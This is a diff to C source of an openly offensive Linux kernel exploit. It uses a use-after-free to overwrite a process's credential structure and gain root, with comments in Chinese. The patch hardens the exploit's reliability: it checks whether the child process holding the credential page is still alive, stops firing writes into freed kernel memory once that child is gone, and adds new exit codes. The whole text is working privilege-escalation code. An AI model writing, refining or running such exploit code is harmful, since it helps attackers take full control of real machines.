@@ -2373,10 +2373,23 @@ int uaf_plant_main(int argc, char **argv)
 	const char *cred_field_name[4] = { "uid/gid", "euid/egid", "suid/sgid", "fsuid/fsgid" };
 	int field_done[4] = { 0, 0, 0, 0 };
 	int half_cleared_streak = 0;
+	/* 2.0.44（RC-5b 修订）：child 是 g_cred_kva 指向 cred 页的唯一持有者，
+	 * 其消亡即对象引用归零、页被内核释放——此后对 g_cred_kva 开瓦片就是
+	 * 写 freed slab（堆破坏）。循环内每轮探活，真死立即停火。 */
+	int child_gone = 0;
 	for (int attempt = 1; attempt <= 24 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1, cgid = 1, cegid = 1;
 		unsigned uids[4], gids[4];
 		int have_ids;
+		if (kill(g_cred_child_pid, 0) != 0 && errno != EPERM) {
+			/* EPERM = 活着且已 root（2.0.37 起的判定）；其余 errno
+			 * （实际只会是 ESRCH）= 真死，停火。 */
+			child_gone = 1;
+			dprintf(STDOUT_FILENO,
+				"[cred] child %d is gone errno=%d; stop firing tiles\n",
+				g_cred_child_pid, errno);
+			break;
+		}
 		dprintf(STDOUT_FILENO, "[cred] clear attempt %d/24 cred=%#" PRIx64 "\n",
 			attempt, g_cred_kva);
 		if (!g_cred_kva) {
@@ -2458,18 +2471,25 @@ int uaf_plant_main(int argc, char **argv)
 		}
 	}
 	if (!rooted) {
-		/* 2.0.41：cred 子进程已消失（ESRCH）时快速退场——它是唯一持页者，
-		 * 其消失意味着 UAF 引用已全部释放，驻留纯属泄漏。 */
-		if (daemon_exit && kill(g_cred_child_pid, 0) != 0 && errno == ESRCH) {
+		/* 2.0.44（RC-5b 修订）：两种终局都没有需要驻留守护的状态——
+		 * 无 cred 时不持页；child 消亡时持页者已不存在。均干净退场，
+		 * 与 rc=5（leak_task 失败，L2332）区分开；只有「child 活着且
+		 * 已捕获 cred」的情形保留持页驻留（杀 child 会内核恐慌）。 */
+		int dead_child = child_gone ||
+			(kill(g_cred_child_pid, 0) != 0 && errno == ESRCH);
+		if (!g_cred_kva || dead_child) {
 			dprintf(STDOUT_FILENO,
-				"[uaf] inject failed: cred child died before the handoff; exiting cleanly\n");
+				"[uaf] inject failed: %s; exiting cleanly (rc=%d)\n",
+				dead_child ? "cred child is gone"
+					   : "no cred object was ever leaked",
+				dead_child ? 7 : 6);
 			log_sync();
 			close(g_wake[1]);
 			close(g_report[0]);
 			close_stream();
 			free_aio_hold();
 			log_sync();
-			return 5;
+			return dead_child ? 7 : 6;
 		}
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
 		for (;;)
